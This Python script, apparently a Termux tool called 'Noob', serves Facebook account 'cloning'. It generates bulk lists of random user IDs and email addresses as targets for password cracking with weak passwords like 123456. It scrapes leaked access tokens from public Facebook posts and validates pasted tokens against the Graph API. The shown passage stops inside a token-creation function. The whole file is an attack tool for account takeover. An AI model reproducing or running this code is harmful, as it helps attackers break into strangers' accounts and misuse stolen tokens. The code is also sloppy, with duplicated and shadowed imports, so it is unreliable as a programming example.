#!/usr/bin/python
import os
import sys
try:
    import requests
except ModuleNotFoundError:
    print("[*] Installing Module requests")
    os.system("python -m pip install requests &> /dev/null")
try:
    import bs4
except ModuleNotFoundError:
    print("[*] Installing Module bs4")
    os.system("python -m pip install bs4 &> /dev/null")
try:
    import mechanize
except ModuleNotFoundError:
    print("[*] Install Module mechanize")
    os.system("python -m pip install mechanize &> /dev/null")
try:
    import gTTS
except ModuleNotFoundError:
    os.system("python -m pip install gTTS &> /dev/null")
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import requests as req
import requests as re
import time
import random
import json
import sys
import time
import datetime
import hashlib
import platform
import re
import threading
import urllib
import uuid
import ipaddress
import calendar
import requests
import mechanize
import bs4
import sys
import os
import subprocess
import random
import base64
import platform
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import ThreadPoolExecutor as zthreads
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor as profacc
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from requests.exceptions import ConnectionError
id1 = uuid.uuid4().hex[:7].upper()
id2 = uuid.uuid4().hex[:7].upper()
id3 = uuid.uuid4().hex[:7].upper()
key = id1 + '-' +id2 + '-' + id3
key1 = id1 + '-' +id2 + '-' + id3
os.system("rm -rf server.txt &> /dev/null")
def logo():
	os.system("clear")
	time.sleep(0.5)
	print("\x1b[0;97m               d8b   db  .d88b.   .d88b.  d8888b. \n               888o  88 .8P  Y8. .8P  Y8. 88  `8D \n               88V8o 88 88    88 88    88 88oooY' \n               88 V8o88 88    88 88    88 88    b. \n               88  V888 `8b  d8' `8b  d8' 88   8D \n               VP   V8P  `Y88P'   `Y88P'  Y8888P'")
	print("-----------------------------------------------------------------")
	print("     [*] Tool Name : Noob             [*] Version : 0.0.0.1     ")
	print("-----------------------------------------------------------------")
ua_xaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
try:
	user_ip = requests.get("http://ip-api.com/json/").json()["query"]
except:
	user_ip = ' - '
try:
	user_country = requests.get("http://ip-api.com/json/").json()["country"].lower()
except:
	user_country = ' - '
try:
	user_regionName = requests.get("http://ip-api.com/json/").json()["regionName"].lower()
except:
	user_regionName = ' - '
ct = datetime.now()
n = ct.month
monthsx = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
year = current.year
bu = current.month
cday = current.day
months = monthsx[nTemp]
my_date = date.today()
day = calendar.day_name[my_date.weekday()]
alldate = ("%s-%s-%s-%s"%(day, cday, months, year))
alldatex = ("%s %s %s"%(cday, months, year))
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
def jalanx(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.09)
try:
	key = open('/data/data/com.termux/files/usr/bin/master.txt', 'r').read()
except:
	kok = open('/data/data/com.termux/files/usr/bin/master.txt', 'w')
	kok.write(key1)
	kok.close()
key = open('/data/data/com.termux/files/usr/bin/master.txt', 'r').read()
def fb_login():
	os.system("rm -rf Cloning/Facebook/Data/fb_token.txt");logo()
	token = input('[*] Enter Your Token : ')
	if token[:4] in ['EAAB','EAAG','EAAD']:
		pass
	else:
		print("\n[*] Create Token  From Kiwi Browser")
		print("[*] Use EAAB Token For Login - Thank u")
		print("[*] Don't Use This Token Again : " + token )
		time.sleep(1.5)
		fb_login()
	try:
		u = requests.get('https://graph.facebook.com/me?access_token='+token).text
		u1 = json.loads(u)
		name = u1['name']
		ts = open('Cloning/Facebook/Data/fb_token.txt', 'w')
		ts.write(token)
		ts.close()
		print("\n\n[*] Login Successful as \x1b[0;92m" + name + "\x1b[0;97m")
		input("[*] Back ");time.sleep(2);fb_menu()
	except KeyError:
		print('\n\n[*] Token Expired ')
		time.sleep(1)
		fb_login()
ok = []
cp = []
id = []
user = []
num = 0
loop = 0
Bilal_Haider_ID = print
Bilal_Haider = open
Prof_Bilal = requests.get
_silet_koceng_  = requests.Session()
url_mb = "https://mbasic.facebook.com"
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_key = {"january": "January", "february": "February", "march": "March", "april": "April", "may": "May", "june": "June", "july": "July", "august": "August", "september": "September", "october": "October", "november": "November", "december": "December"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_realme = 'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3'
P = '\x1b[1;97m' # PUTIH
M = '\033[0;91m' # MERAH 
H = '\033[1;92m' # HIJAU 
K = '\033[1;91m' # KUNING 
B = '\033[0;94m' # BIRU 
U = '\033[0;95m' # UNGU 
O = '\033[0;96m' # BIRU MUDA
N = '\033[0m'	# WARNA MATI 
def login():
	os.system("rm -rf access_token.txt");logo()
	tok = input('[*] Enter Your Token : ')
	try:
		u = requests.get('https://graph.facebook.com/me?access_token='+tok).text
		u1 = json.loads(u)
		name = u1['name']
		ts = open('access_token.txt', 'w')
		ts.write(tok)
		ts.close()
		print("\n\n[*] Login Successful as " + name )
		time.sleep(1)
		fb_menu()
	except KeyError:
		print('\n\n[*] Token Expired ')
		time.sleep(1)
		login()
def dump_random_old():
	logo()
	os.system("rm -rf Cloning/Facebook/Dump/old.txt")
	print("[01] 1000000000 : 10")
	print("[02] 100000000 : 9")
	print("[03] 10000000 : 8")
	print("[04] 1000000 : 7")
	print("[05] 100000 : 6")
	print("[06] 10000 : 5")
	print("")
	ben = input("[>] Choose : ")
	try:
		print("")
		lim_ = int(input("[>] Cracking Limit : "))
		separator = input("[>] Enter ID And Name Separator : ")
	except:lim_ = "5000"
	if ben == "" or ben == " ":
		time.sleep(2)
		fb_menu()
	elif ben == "1" or ben == "01":
		_             = 11111
		__            = 99999
		___ ="1000000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/old.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		jalanx("[*] For Example : 123456,123456789")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "2" or ben == "02":
		_            = 111111
		__           = 999999
		___ ="100000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/old.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		jalanx("[*] For Example : 123456,123456789")
		print("")
		input("[*] Back ")
	elif ben == "3" or ben == "03":
		_           = 1111111
		__          = 9999999
		___ ="10000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/old.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		jalanx("[*] For Example : 123456,123456789")
		print("")
		input("[*] Back ")
	elif ben == "4" or ben == "04":
		_          = 11111111
		__         = 99999999
		___ ="1000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/old.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		jalanx("[*] For Example : 123456,123456789")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "5" or ben == "05":
		_         = 111111111
		__        = 999999999
		___ ="100000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/old.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		jalanx("[*] For Example : 123456,123456789")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "6" or ben == "06":
		_        = 1111111111
		__       = 9999999999
		___ ="10000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/old.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		jalanx("[*] For Example : 123456,123456789")
		print("")
		input("[*] Back ")
		fb_menu()
	else:
		fb_menu()
def dump_random_new():
	logo()
	os.system("rm -rf Cloning/Facebook/Dump/new.txt")
	print("[01] Dump Random User ID 100010 ")
	print("[02] Dump Random User ID 100020 ")
	print("[03] Dump Random User ID 100030 ")
	print("[04] Dump Random User ID 100040 ")
	print("[05] Dump Random User ID 100050 ")
	print("[06] Dump Random User ID 100060  ")
	print("[07] Dump Random User ID 100070 ")
	print("[08] Dump Random User ID 100080 ")
	print("[09] Dump Random User ID 100090 ")
	print("[10] Dump Random User ID 100100 ")
	print("")
	ben = input("[>] Choose : ")
	try:
		print("")
		lim_ = int(input("[>] Cracking Limit : "))
		separator = input("[>] Enter ID And Name Separator : ")
	except:lim_ = "5000"
	if ben == "" or ben == " ":
		time.sleep(2)
		fb_menu()
	elif ben == "1" or ben == "01":
		_         = 111111111
		__        = 999999999
		___ ="100010"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "2" or ben == "02":
		_         = 111111111
		__        = 999999999
		___ ="100020"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
	elif ben == "3" or ben == "03":
		_         = 111111111
		__        = 999999999
		___ ="100030"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
	elif ben == "4" or ben == "04":
		_         = 111111111
		__        = 999999999
		___ ="100040"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "5" or ben == "05":
		_         = 111111111
		__        = 999999999
		___ ="100050"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "6" or ben == "06":
		_         = 111111111
		__        = 999999999
		___ ="100060"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "7" or ben == "07":
		_         = 111111111
		__        = 999999999
		___ ="100070"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "8" or ben == "08":
		_         = 111111111
		__        = 999999999
		___ ="100080"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "9" or ben == "09":
		_         = 111111111
		__        = 999999999
		___ ="100090"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "10":
		_         = 111111111
		__        = 999999999
		___ ="100100"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	else:
		fb_menu()
def auto_token_x1():
	logo()
	ba = 0
	bi = 0
	link_token = requests.get("https://free.facebook.com/100025338049048/posts/1076164763238115/?app=fbl")
	token_free = re.findall("EAA\w+", link_token.text)
	for naa in token_free:
		ba += 1
		if len(naa)>=37:
			token = naa
			time.sleep(1)
			print("\n[*] Token : "+str(ba)+" \033[0;97m"+naa)
	exit()
def auto_token_x2():
	logo()
	ba = 0
	bi = 0
	link_token = requests.get("https://free.facebook.com/story.php?story_fbid=213614107297063&id=100059454248601&_rdr")
	token_free = re.findall("EAA\w+", link_token.text)
	for naa in token_free:
		ba += 1
		if len(naa)>=37:
			token = naa
			time.sleep(1)
			print("\n[*] Token : "+str(ba)+" \033[0;97m"+naa)
	exit()
def auto_token_x3():
	logo()
	ba = 0
	bi = 0
	link_token = requests.get("https://free.facebook.com/story.php?story_fbid=180923747373969&id=100063690353340&_rdr")
	token_free = re.findall("EAA\w+", link_token.text)
	for naa in token_free:
		ba += 1
		if len(naa)>=37:
			token = naa
			time.sleep(1)
			print("\n[*] Token : "+str(ba)+" \033[0;97m"+naa)
	exit()
def auto_token_x4():
	logo()
	ba = 0
	bi = 0
	link_token = requests.get("https://m.facebook.com/photo.php?fbid=120338706765807&id=100063690353340&set=a.116524033813941&source=11&ref=bookmarks")
	token_free = re.findall("EAA\w+", link_token.text)
	for naa in token_free:
		ba += 1
		if len(naa)>=37:
			token = naa
			time.sleep(1)
			print("\n[*] Token : "+str(ba)+" \033[0;97m"+naa)
	exit()
def auto_token_x5():
	logo()
	ba = 0
	bi = 0
	link_token = requests.get("https://free.facebook.com/100076835203956/posts/134364555801384/?app=fbl")
	token_free = re.findall("EAA\w+", link_token.text)
	for naa in token_free:
		ba += 1
		if len(naa)>=37:
			token = naa
			time.sleep(1)
			print("\n[*] Token : "+str(ba)+" \033[0;97m"+naa)
	exit()
def dump_random_mostold():
	logo()
	os.system("rm -rf Cloning/Facebook/Dump/mostold.txt")
	print("[01] Dump Random User ID 9 Digits ")
	print("[02] Dump Random User ID 8 Digits ")
	print("[03] Dump Random User ID 7 Digits ")
	print("[04] Dump Random User ID 6 Digits ")
	print("[05] Dump Random User ID 5 Digits ")
	print("[06] Dump Random User ID 4 Digits ")
	print("[07] Dump Random User ID 3 Digits ")
	print("")
	ben = input("[>] Choose : ")
	try:
		print("")
		lim_ = int(input("[>] Cracking Limit : "))
		separator = input("[>] Enter ID And Name Separator : ")
	except:lim_ = "5000"
	if ben == "" or ben == " ":
		time.sleep(2)
		fb_menu()
	elif ben == "1" or ben == "01":
		_         = 111111111
		__        = 999999999
		___ =""
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/mostold.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/mostold.txtFile")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "2" or ben == "02":
		_         = 11111111
		__        = 99999999
		___ =""
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/mostold.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/mostold.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
	elif ben == "3" or ben == "03":
		_         = 1111111
		__        = 9999999
		___ =""
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/mostold.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/mostold.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
	elif ben == "4" or ben == "04":
		_         = 111111
		__        = 999999
		___ =""
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/mostold.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/mostold.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "5" or ben == "05":
		_         = 11111
		__        = 99999
		___ =""
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/mostold.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/mostold.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "6" or ben == "06":
		_         = 1111
		__        = 9999
		___ =""
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/mostold.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/mostold.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "7" or ben == "07":
		_         = 111
		__        = 999
		___ =""
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/mostold.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Sorry_Bro_I'am_Noob\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Cloning/Facebook/Dump/mostold.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	else:
		fb_menu()
def email_dump():
	os.system("rm -rf Cloning/Facebook/Dump/email.txt")
	logo()
	try:
		print("")
		lim_ = int(input("[>] Cracking Limit : "))
		print("")
		print("[*] For Example ")
		print("[*] Username : muhammedali ")
		print("[*] Domain Name : @gmail.com ")
		print("[*] Enter ID And Name Separator : | ")
		print("[*] Enter Full User Name With Space : Ali Khan ")
		print("")
		print("")
		___ = input("[>] Enter Email Username : ")
		domain = input("[>] Enter Domain Name : ")
		separator = input("[>] Enter ID And Name Separator : ")
		passusername = input("[>] Enter Full User Name With Space : ")
	except:lim_ = "5000"
	ben = '01'
	if ben == "1" or ben == "01":
		_             = 1
		__            = 9999
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Cloning/Facebook/Dump/email.txt', 'a')
				old_a.write(str(___)+str(bokeq)+domain+separator+passusername+"\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Dump/email.txt File")
		jalanx("[*] Crack File From Any Script Using Auto Passwords  ")
		print("")
		print("")
		input("[*] Back ")
	else:
		fb_menu()
def create_token():
	logo()
	try:
		_agent=open('Cloning/Facebook/Data/usergent2.txt').read()
	except:
		try:
			_agent=input("[*] Enter Your User-Agent : ")
			open("Cloning/Facebook/Data/usergent2.txt", 'a').write(_agent)
		except:
			_agent=input("[*] Enter Your User-Agent : ")
			open("Cloning/Facebook/Data/usergent2.txt", 'a').write(_agent)
	try:
		user=input("\n[*] Email or User ID : ")
